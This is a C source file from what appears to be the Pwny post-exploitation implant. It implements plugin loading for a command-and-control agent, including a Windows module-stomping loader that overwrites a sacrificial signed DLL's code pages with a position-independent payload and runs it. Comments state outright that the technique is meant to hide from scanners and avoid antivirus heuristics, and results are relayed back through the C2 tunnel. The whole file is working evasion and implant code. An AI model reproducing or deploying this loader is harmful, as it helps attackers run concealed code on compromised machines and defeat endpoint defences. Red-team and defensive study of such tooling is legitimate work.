/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <ev.h>

#include <pwny/tabs.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/log.h>
#include <pwny/tlv.h>
#include <pwny/queue.h>
#include <pwny/group.h>
#include <pwny/pipe.h>

#include <uthash/uthash.h>

#ifdef __windows__

/*
 * =============================================================
 * Windows: In-process DLL tabs via standard LoadLibrary,
 * plus Code-Only Tabs (COT) via module stomping.
 *
 * DLL path: Each tab DLL exports a TabInit function that receives a
 * pointer to the tab's private api_calls hash table. The DLL
 * registers its handlers there. When a request comes in with
 * TLV_TYPE_TAB_ID, tabs_lookup dispatches directly via
 * api_call_make — no child process, no pipes, no IPC.
 *
 * COT path: A flat position-independent code blob (produced by
 * pe2cot.py) is stomped into a sacrificial signed DLL's pages.
 * No PE headers, no disk drop, no unreferenced VA allocations.
 * All API calls go through a vtable populated by the host.
 *
 * For memory-buffer loads: write to temp file → LoadLibraryA.
 * This avoids embedding a manual PE mapper (VirtualAlloc +
 * section copy + relocation + import resolution) which is a
 * major AV heuristic trigger.
 * =============================================================
 */

#include <windows.h>

/*
 * TAB_TERM — the Python side sends this to gracefully terminate
 * a tab before deleting it.  Must match tab.h / api.py.
 */
#define TAB_TERM \
        TLV_TAG_CUSTOM(API_CALL_INTERNAL, \
                       3, \
                       API_CALL)

static tlv_pkt_t *tab_term_handler(c2_t *c2)
{
    return api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
}

/* Tab DLL init prototype:
 *   void TabInit(api_calls_t **api_calls);
 * The DLL calls api_call_register() on the provided table. */
typedef void (*tab_init_t)(api_calls_t **api_calls);

/* Optional pipe init:
 *   void TabInitPipes(pipes_t **pipes);
 * The DLL calls api_pipe_register() on the host's pipes table. */
typedef void (*tab_init_pipes_t)(pipes_t **pipes);

/*
 * Write raw DLL bytes to a temp file and return the path.
 * Caller must free() the returned string and delete the file.
 */
static char *write_temp_dll(unsigned char *image, size_t length)
{
    char temp_dir[MAX_PATH];
    char *temp_file;
    HANDLE hFile;
    DWORD written;

    if (GetTempPathA(MAX_PATH, temp_dir) == 0)
    {
        return NULL;
    }

    temp_file = calloc(MAX_PATH, sizeof(char));
    if (temp_file == NULL)
    {
        return NULL;
    }

    if (GetTempFileNameA(temp_dir, "tw", 0, temp_file) == 0)
    {
        free(temp_file);
        return NULL;
    }

    hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DeleteFileA(temp_file);
        free(temp_file);
        return NULL;
    }

    if (!WriteFile(hFile, image, (DWORD)length, &written, NULL) ||
        written != (DWORD)length)
    {
        CloseHandle(hFile);
        DeleteFileA(temp_file);
        free(temp_file);
        return NULL;
    }

    CloseHandle(hFile);
    return temp_file;
}

/* ------------------------------------------------------------------ */
/* Code-Only Tab (COT) — module stomping loader                        */
/* ------------------------------------------------------------------ */

#include <pwny/tab_cot.h>

/*
 * Generic Win32 API resolver for COT plugins.
 *
 * plugins call: cot_resolve("kernel32.dll", "VirtualProtect")
 * → GetModuleHandleA first (fast, no refcount), fall back to LoadLibraryA.
 */
static void *cot_resolve_func(const char *module, const char *func)
{
    HMODULE hMod;

    hMod = GetModuleHandleA(module);
    if (hMod == NULL)
        hMod = LoadLibraryA(module);
    if (hMod == NULL)
        return NULL;

    return (void *)GetProcAddress(hMod, func);
}

/*
 * Build the vtable that COT plugins use to call back into the host.
 * Every function pointer here is resolved from the host's own
 * statically-linked code — no new imports.
 */
static void cot_build_vtable(tab_vtable_t *vt)
{
    memset(vt, 0, sizeof(*vt));

    vt->api_call_register = api_call_register;
    vt->api_pipe_register = api_pipe_register;
    vt->api_craft_tlv_pkt = api_craft_tlv_pkt;
    vt->tlv_pkt_create    = tlv_pkt_create;
    vt->tlv_pkt_destroy   = tlv_pkt_destroy;
    vt->tlv_pkt_add_u32   = tlv_pkt_add_u32;
    vt->tlv_pkt_add_string = tlv_pkt_add_string;
    vt->tlv_pkt_add_bytes = tlv_pkt_add_bytes;
    vt->tlv_pkt_add_tlv   = tlv_pkt_add_tlv;
    vt->tlv_pkt_get_u32   = (int (*)(tlv_pkt_t *, int, int32_t *))tlv_pkt_get_u32;
    vt->tlv_pkt_get_string = (int (*)(tlv_pkt_t *, int, char *))tlv_pkt_get_string;
    vt->tlv_pkt_get_bytes = (int (*)(tlv_pkt_t *, int, unsigned char **))tlv_pkt_get_bytes;
#ifdef DEBUG
    vt->log_debug         = log_debug;
#else
    vt->log_debug         = (void (*)(const char *, ...))NULL;
#endif

    /* Generic resolver — plugins can fetch any Win32 function */
    vt->resolve = cot_resolve_func;

    /* CRT heap functions — plugins use these transparently via macros */
    vt->crt_malloc  = malloc;
    vt->crt_free    = free;
    vt->crt_calloc  = calloc;

    /* C2 enqueue — plugins can push unsolicited TLV packets */
    vt->c2_enqueue_tlv = c2_enqueue_tlv;
}

/*
 * Check if a buffer starts with the COT magic header.
 */
static int cot_is_cot_image(unsigned char *image, size_t length)
{
    cot_header_t *hdr;

    if (length < sizeof(cot_header_t))
        return 0;

    hdr = (cot_header_t *)image;
    return (hdr->magic == COT_MAGIC && hdr->version == COT_VERSION);
}

/*
 * Load a COT blob via module stomping.
 *
 * 1. LoadLibrary a sacrificial signed DLL
 * 2. VirtualProtect its pages to RW
 * 3. Copy the COT code over the sacrificial .text section
 * 4. VirtualProtect to RX
 * 5. Call TabInitCOT via the vtable
 *
 * The VAD still shows the memory as backed by the signed DLL
 * on disk — invisible to most scanners.
 */
static int tabs_add_cot(tabs_t **tabs, int id,
                        unsigned char *image, size_t length,
                        const char *candidate,
                        c2_t *c2)
{
    cot_header_t *hdr;
    unsigned char *code;
    size_t code_size;

    HMODULE hStomp = NULL;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    SIZE_T image_size;
    DWORD dwOld;
    void *stomp_text;

    tab_vtable_t *vt;
    cot_init_t entry;
    tabs_t *tab;
    tabs_t *tab_new;

    hdr = (cot_header_t *)image;
    code = image + sizeof(cot_header_t);
    code_size = hdr->code_size;

    {
        size_t needed = sizeof(cot_header_t) + code_size
                      + (size_t)hdr->reloc_count * sizeof(uint32_t);
        if (needed > length)
        {
            log_debug("* cot: truncated image (need %zu, got %zu)\n",
                      needed, length);
            return -1;
        }
    }

    if (hdr->entry_offset >= code_size)
    {
        log_debug("* cot: entry offset out of bounds\n");
        return -1;
    }

    if (candidate == NULL || candidate[0] == '\0')
    {
        log_debug("* cot: no stomp candidate provided\n");
        return -1;
    }

    HASH_FIND_INT(*tabs, &id, tab);
    if (tab != NULL)
        return -1;

    /* Load the server-selected sacrificial DLL.
     * The Python side tracks which candidates are available and
     * already in use — no hardcoded list in the binary. */
    hStomp = LoadLibraryA(candidate);
    if (hStomp == NULL)
    {
        log_debug("* cot: LoadLibrary(%s) failed (%lu)\n",
                  candidate, GetLastError());
        return -1;
    }

    /* Prevent the OS loader from calling the sacrifice DLL's entry
     * point on DLL_THREAD_ATTACH / DLL_THREAD_DETACH.  After we
     * overwrite its code pages with COT code, the cached
     * AddressOfEntryPoint in the loader's LDR_DATA_TABLE_ENTRY
     * would dispatch into the wrong code, crashing on the next
     * thread create/exit. */
    DisableThreadLibraryCalls(hStomp);

    dos = (PIMAGE_DOS_HEADER)hStomp;
    nt  = (PIMAGE_NT_HEADERS)((BYTE *)hStomp + dos->e_lfanew);
    image_size = nt->OptionalHeader.SizeOfImage;

    if (image_size < code_size + 0x1000)
    {
        log_debug("* cot: candidate %s too small (image %zu, need %zu)\n",
                  candidate, (size_t)image_size, code_size);
        FreeLibrary(hStomp);
        return -1;
    }

    log_debug("* cot: using stomp candidate %s (image %zu, need %zu)\n",
              candidate, (size_t)image_size, code_size);

    /* Stomp target: first page after the PE header */
    stomp_text = (BYTE *)hStomp + 0x1000;

    /* Make pages writable */
    if (!VirtualProtect(stomp_text, code_size, PAGE_READWRITE, &dwOld))
    {
        log_debug("* cot: VirtualProtect(RW) failed (%lu)\n", GetLastError());
        goto fail_stomp;
    }

    /* Overwrite with COT code */
    memcpy(stomp_text, code, code_size);

    /* Apply base relocations — v2 COT blobs carry a fixup table
     * after the code blob.  Each entry is a blob-relative offset
     * of a DIR64 value to adjust by the difference between the
     * runtime base and the original link-time base. */
    if (hdr->reloc_count > 0)
    {
        uint32_t *relocs;
        int64_t delta;
        DWORD i;

        relocs = (uint32_t *)(code + code_size);
        delta  = (int64_t)((uintptr_t)stomp_text
                         - (uintptr_t)hdr->original_base);

        for (i = 0; i < hdr->reloc_count; i++)
        {
            if (relocs[i] + sizeof(uint64_t) <= code_size)
            {
                *(uint64_t *)((BYTE *)stomp_text + relocs[i]) += delta;
            }
        }

        log_debug("* cot: applied %u relocations (delta 0x%llx)\n",
                  hdr->reloc_count, (unsigned long long)delta);
    }

    /* Set page protections: RX for code/rodata, RW for .data */
    if (hdr->rw_offset > 0 && hdr->rw_size > 0)
    {
        /* Code region before writable section → RX */
        if (!VirtualProtect(stomp_text, hdr->rw_offset,
                            PAGE_EXECUTE_READ, &dwOld))
        {
            log_debug("* cot: VirtualProtect(RX code) failed (%lu)\n",
                      GetLastError());
            goto fail_stomp;
        }

        /* Writable region (.data/.bss) → RW */
        if (!VirtualProtect((BYTE *)stomp_text + hdr->rw_offset,
                            hdr->rw_size, PAGE_READWRITE, &dwOld))
        {
            log_debug("* cot: VirtualProtect(RW data) failed (%lu)\n",
                      GetLastError());
            goto fail_stomp;
        }

        /* Trailing region after .data (if any) → RX */
        if (hdr->rw_offset + hdr->rw_size < code_size)
        {
            size_t tail_off  = hdr->rw_offset + hdr->rw_size;
            size_t tail_size = code_size - tail_off;
            VirtualProtect((BYTE *)stomp_text + tail_off,
                           tail_size, PAGE_EXECUTE_READ, &dwOld);
        }
    }
    else
    {
        /* No writable region — entire blob is RX */
        if (!VirtualProtect(stomp_text, code_size,
                            PAGE_EXECUTE_READ, &dwOld))
        {
            log_debug("* cot: VirtualProtect(RX) failed (%lu)\n",
                      GetLastError());
            goto fail_stomp;
        }
    }

    FlushInstructionCache(GetCurrentProcess(), stomp_text, code_size);

    /* Heap-allocate vtable so it outlives this function.
     * The COT plugin stores a pointer to it (_cot_vt) and uses
     * it every time a handler fires. */
    vt = calloc(1, sizeof(*vt));
    if (vt == NULL)
    {
        goto fail_stomp;
    }
    cot_build_vtable(vt);
    vt->hModule = (void *)hStomp;

    tab_new = calloc(1, sizeof(*tab_new));
    if (tab_new == NULL)
    {
        free(vt);
        goto fail_stomp;
    }

    tab_new->id = id;
    tab_new->c2 = c2;
    tab_new->hModule = NULL;
    tab_new->temp_path = NULL;
    tab_new->hStomp = hStomp;
    tab_new->cot_code = stomp_text;
    tab_new->cot_size = code_size;
    tab_new->cot_vtable = vt;
    tab_new->api_calls = NULL;
    tab_new->pipes = NULL;

    /* Call TabInitCOT(vtable, &api_calls, &pipes) */
    entry = (cot_init_t)((BYTE *)stomp_text + hdr->entry_offset);
    entry(vt, &tab_new->api_calls, &tab_new->pipes);

    /* Register pipe handlers so PIPE_CREATE etc. dispatch
     * through the tab with its own per-tab pipe table. */
    register_pipe_api_calls(&tab_new->api_calls);

    /* Register the TAB_TERM handler so the Python side can
     * gracefully terminate this tab before deletion. */
    api_call_register(&tab_new->api_calls, TAB_TERM, (api_t)tab_term_handler);

    HASH_ADD_INT(*tabs, id, tab_new);
    log_debug("* Added COT TAB entry (%d), %zu bytes stomped\n", id, code_size);
    return 0;

fail_stomp:
    FreeLibrary(hStomp);
    return -1;
}

/* ------------------------------------------------------------------ */

int tabs_add(tabs_t **tabs, int id,
             char *filename,
             unsigned char *image,
             size_t length,
             c2_t *c2)
{
    tabs_t *tab;
    tabs_t *tab_new;
    HMODULE hMod;
    tab_init_t pfnTabInit;
    char *temp_path = NULL;

    /* Auto-detect COT blobs by magic header */
    if (image != NULL && length > 0 && cot_is_cot_image(image, length))
    {
        log_debug("* tabs: detected COT image, using module stomping\n");
        return tabs_add_cot(tabs, id, image, length, filename, c2);
    }

    HASH_FIND_INT(*tabs, &id, tab);
    if (tab != NULL)
    {
        return -1;
    }

    /* Load the DLL via standard Windows loader */
    if (image != NULL && length > 0)
    {
        /* Memory buffer — write to temp file first */
        temp_path = write_temp_dll(image, length);
        if (temp_path == NULL)
        {
            log_debug("* tabs: failed to write temp DLL\n");
            return -1;
        }
        hMod = LoadLibraryA(temp_path);
    }
    else if (filename != NULL)
    {
        /* Load directly from disk */
        hMod = LoadLibraryA(filename);
    }
    else
    {
        return -1;
    }

    if (hMod == NULL)
    {
        log_debug("* tabs: LoadLibrary failed (%lu)\n", GetLastError());
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    /* Resolve TabInit from the loaded DLL */
    pfnTabInit = (tab_init_t)GetProcAddress(hMod, "TabInit");

    if (pfnTabInit == NULL)
    {
        log_debug("* tabs: TabInit export not found\n");
        FreeLibrary(hMod);
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    tab_new = calloc(1, sizeof(*tab_new));
    if (tab_new == NULL)
    {
        FreeLibrary(hMod);
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    tab_new->id = id;
    tab_new->c2 = c2;
    tab_new->hModule = hMod;
    tab_new->temp_path = temp_path;
    tab_new->api_calls = NULL;
    tab_new->pipes = NULL;

    /* Let the DLL register its handlers */
    pfnTabInit(&tab_new->api_calls);

    /* Register pipe handlers so PIPE_CREATE etc. dispatch
     * through the tab with its own per-tab pipe table. */
    register_pipe_api_calls(&tab_new->api_calls);

    /* Register the TAB_TERM handler so the Python side can
     * gracefully terminate this tab before deletion. */
    api_call_register(&tab_new->api_calls, TAB_TERM, (api_t)tab_term_handler);

    /* Let the DLL register pipe types (optional) */
    {
        tab_init_pipes_t pfnTabInitPipes;
        pfnTabInitPipes = (tab_init_pipes_t)GetProcAddress(hMod, "TabInitPipes");
        if (pfnTabInitPipes != NULL)
        {
            pfnTabInitPipes(&tab_new->pipes);
        }
    }

    HASH_ADD_INT(*tabs, id, tab_new);
    log_debug("* Added DLL TAB entry (%d)\n", id);
    return 0;
}

int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
{
    tabs_t *tab;
    int tag;
    tlv_pkt_t *result;
    pipes_t *saved_pipes;

    log_debug("* Searching for TAB entry (%d)\n", id);
    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        log_debug("* TAB was not found (%d)\n", id);
        return -1;
    }

    log_debug("* Found DLL TAB entry (%d)\n", id);

    if (tlv_pkt_get_u32(tlv_pkt, TLV_TYPE_TAG, &tag) < 0)
    {
        return -1;
    }

    /* Set request on the C2 and dispatch directly in-process.
     * Swap c2->pipes to the tab's own per-tab pipe table so that
     * pipe commands (PIPE_CREATE, PIPE_READ, etc.) operate on the
     * tab's isolated pipe registrations, not the global table. */
    tab->c2->request = tlv_pkt;

    saved_pipes = tab->c2->pipes;
    tab->c2->pipes = tab->pipes;

    if (api_call_make(&tab->api_calls, tab->c2, tag, &result) != 0)
    {
        result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED, tlv_pkt);
    }

    tab->c2->pipes = saved_pipes;

    if (result != NULL)
    {
        tab->c2->response = result;

        /* Send the response back through the C2 tunnel */
        if (c2_enqueue_tlv(tab->c2, result) == 0)
        {
            if (tab->c2->write_link)
            {
                tab->c2->write_link(tab->c2->link_data);
            }
        }

        tlv_pkt_destroy(result);
        tab->c2->response = NULL;
    }

    return 0;
}

int tabs_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        if (tab->api_calls)
        {
            api_calls_free(tab->api_calls);
        }

        if (tab->pipes)
        {
            api_pipes_free(tab->pipes);
        }

        /* COT cleanup: zero the stomped pages, patch the sacrifice
         * DLL's entry point so FreeLibrary's DLL_PROCESS_DETACH does
         * not execute zeroed memory, then release the module. */
        if (tab->cot_code != NULL)
        {
            DWORD dwOld;
            VirtualProtect(tab->cot_code, tab->cot_size,
                           PAGE_READWRITE, &dwOld);
            SecureZeroMemory(tab->cot_code, tab->cot_size);

            if (tab->hStomp)
            {
                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)tab->hStomp;
                PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
                    (BYTE *)tab->hStomp + dos->e_lfanew);
                DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;

                if (ep_rva >= 0x1000 &&
                    ep_rva + 6 <= 0x1000 + tab->cot_size)
                {
                    /* x64 stub: mov eax, 1; ret  (DllMain returns TRUE) */
                    BYTE *entry = (BYTE *)tab->hStomp + ep_rva;
                    entry[0] = 0xB8; entry[1] = 0x01; entry[2] = 0x00;
                    entry[3] = 0x00; entry[4] = 0x00; entry[5] = 0xC3;
                }
            }

            VirtualProtect(tab->cot_code, tab->cot_size,
                           PAGE_EXECUTE_READ, &dwOld);
        }

        if (tab->cot_vtable)
        {
            free(tab->cot_vtable);
        }

        if (tab->hStomp)
        {
            FreeLibrary(tab->hStomp);
        }

        if (tab->hModule)
        {
            FreeLibrary(tab->hModule);
        }

        if (tab->temp_path)
        {
            DeleteFileA(tab->temp_path);
            free(tab->temp_path);
        }

        HASH_DEL(*tabs, tab);
        free(tab);

        log_debug("* Deleted TAB entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;
    tabs_t *tab_tmp;

    HASH_ITER(hh, tabs, tab, tab_tmp)
    {
        log_debug("* Freed TAB entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        if (tab->api_calls)
        {
            api_calls_free(tab->api_calls);
        }

        if (tab->pipes)
        {
            api_pipes_free(tab->pipes);
        }

        /* COT cleanup: zero the stomped pages, patch the sacrifice
         * DLL's entry point so FreeLibrary's DLL_PROCESS_DETACH does
         * not execute zeroed memory, then release the module. */
        if (tab->cot_code != NULL)
        {
            DWORD dwOld;
            VirtualProtect(tab->cot_code, tab->cot_size,
                           PAGE_READWRITE, &dwOld);
            SecureZeroMemory(tab->cot_code, tab->cot_size);

            if (tab->hStomp)
            {
                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)tab->hStomp;
                PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
                    (BYTE *)tab->hStomp + dos->e_lfanew);
                DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;

                if (ep_rva >= 0x1000 &&
                    ep_rva + 6 <= 0x1000 + tab->cot_size)
                {
                    /* x64 stub: mov eax, 1; ret  (DllMain returns TRUE) */
                    BYTE *entry = (BYTE *)tab->hStomp + ep_rva;
                    entry[0] = 0xB8; entry[1] = 0x01; entry[2] = 0x00;
                    entry[3] = 0x00; entry[4] = 0x00; entry[5] = 0xC3;
                }
            }

            VirtualProtect(tab->cot_code, tab->cot_size,
                           PAGE_EXECUTE_READ, &dwOld);
        }

        if (tab->cot_vtable)
        {
            free(tab->cot_vtable);
        }

        if (tab->hStomp)
        {
            FreeLibrary(tab->hStomp);
        }

        if (tab->hModule)
        {
            FreeLibrary(tab->hModule);
        }

        if (tab->temp_path)
        {
            DeleteFileA(tab->temp_path);
            free(tab->temp_path);
        }

        free(tab);
    }

    free(tabs);
}

/* Unused on Windows but declared in header for compatibility */
void tabs_err(void *data) { (void)data; }
void tabs_out(void *data) { (void)data; }

#else /* POSIX */

/*
 * =============================================================
 * POSIX: Child-process tabs with pipe-based IPC.
 *
 * Each tab is a standalone executable spawned via fork/exec
 * (or process hollowing on Windows). Communication happens
 * over inherited stdin/stdout pipes using TLV group framing.
 * =============================================================
 */

#include <pwny/link.h>

extern char **environ;

void tabs_err(void *data)
{
    tabs_t *tab;
    queue_t *queue;
    char *message;
    size_t length;

    tab = data;
    queue = tab->child->err_queue.queue;
    length = queue->bytes;
    message = malloc(length + 1);

    if (message != NULL)
    {
        queue_remove(queue, (void *)message, length);
        message[length] = '\0';

        log_debug("[id: %d, pid: %d] %s\n", tab->id, tab->child->pid, message);
        free(message);
    }
}

void tabs_exit(void *data)
{
    tabs_t *tab;

    tab = data;
    (void)tab;
}

void tabs_out(void *data)
{
    tabs_t *tab;
    tlv_pkt_t *tlv_pkt;
    queue_t *queue;

    tab = data;
    queue = tab->child->out_queue.queue;

    if (group_tlv_dequeue(queue, &tlv_pkt, NULL) > 0)
    {
        group_tlv_enqueue(tab->c2->tunnel->egress, tlv_pkt, tab->c2->crypt);
        tlv_pkt_destroy(tlv_pkt);
    }

    if (tab->c2->write_link)
    {
        tab->c2->write_link(tab->c2->link_data);
    }
}

int tabs_add(tabs_t **tabs, int id,
             char *filename,
             unsigned char *image,
             size_t length,
             c2_t *c2)
{
    tabs_t *tab;
    tabs_t *tab_new;
    child_options_t options;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        tab_new = calloc(1, sizeof(*tab_new));

        if (tab_new != NULL)
        {
            options.args = NULL;
            options.env = environ;
            options.flags = CHILD_FORK;
            options.length = length;

            tab_new->id = id;
            tab_new->c2 = c2;
            tab_new->child = child_create(filename, image, &options);

            if (tab_new->child == NULL)
            {
                free(tab_new);
                return -1;
            }

            child_set_links(tab_new->child,
                            tabs_out, tabs_err, tabs_exit,
                            tab_new);
            HASH_ADD_INT(*tabs, id, tab_new);
            log_debug("* Added TAB entry (%d) (pid: %d)\n", id, tab_new->child->pid);
            return 0;
        }
    }

    return -1;
}

int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
{
    tabs_t *tab;
    group_t *group;

    log_debug("* Searching for TAB entry (%d)\n", id);
    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        log_debug("* Found TAB entry (%d)\n", id);

        group = group_create(tlv_pkt, NULL);

        log_debug("* Writing (%d) bytes to TAB\n", group->bytes);
        child_write(tab->child, group->buffer, group->bytes);

        group_destroy(group);
        return 0;
    }

    log_debug("* TAB was not found (%d)\n", id);
    return -1;
}

int tabs_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        child_destroy(tab->child);
        HASH_DEL(*tabs, tab);
        free(tab);

        log_debug("* Deleted TAB entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;
    tabs_t *tab_tmp;

    HASH_ITER(hh, tabs, tab, tab_tmp)
    {
        log_debug("* Freed TAB entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        if (tab->child)
        {
            if (tab->child->status == CHILD_ALIVE)
            {
                child_kill(tab->child);
            }

            child_destroy(tab->child);
        }

        free(tab);
    }

    free(tabs);
}

#endif /* __windows__ */